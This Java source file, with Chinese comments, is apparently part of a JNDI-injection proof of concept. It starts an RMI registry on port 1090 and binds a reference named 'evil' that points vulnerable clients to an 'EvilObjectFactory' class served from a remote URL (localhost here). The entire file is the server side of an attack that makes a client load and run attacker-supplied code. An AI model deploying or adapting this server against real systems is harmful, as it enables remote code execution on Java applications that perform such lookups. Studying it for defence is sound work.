package org.lain.poc.jndi;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author: lanqihe
 * @Date: 下午8:01 2017/12/11
 * @Modified By:
 * @Description: 本地注册一个register，并将恶意的类绑定
 */
public class RMIServer {


    public static void main(String argv[]) {

        try {
            Registry  registry =  LocateRegistry.createRegistry(1090);

            //如果通过rmi无法找到org.lain.poc.jndi.EvilObjectFactory，则尝试从factoryLocation 获取
            //因此，本地测试的话，如果factory正确，factoryLocation随便填写
            Reference reference = new Reference("EvilObject",
                    "org.lain.poc.jndi.EvilObjectFactory",
                    "http://localhost:9999/" );


            //客户端通过evil查找，获取到EvilObject
            registry.bind("evil", new ReferenceWrapper(reference));

            System.out.println("Ready!");
            System.out.println("Waiting for connection......");

        } catch (Exception e) {
            System.out.println("RMIServer: " + e.getMessage());
            e.printStackTrace();
        }
    }
}